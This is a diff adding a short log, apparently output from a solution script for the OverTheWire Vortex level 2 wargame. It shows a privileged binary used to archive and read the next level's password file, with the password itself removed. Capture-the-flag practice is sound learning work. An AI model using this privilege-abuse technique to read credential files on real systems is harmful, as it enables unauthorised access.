@@ -1,0 +1,5 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[+] Opening new channel: '/vortex/vortex2 /etc/vortex_pass/vortex3': OK
+[+] Opening new channel: "tar xOf '/tmp/ownership.$$.tar'": OK
+[+] Recieving all data: OK
+[+] password: <removed>
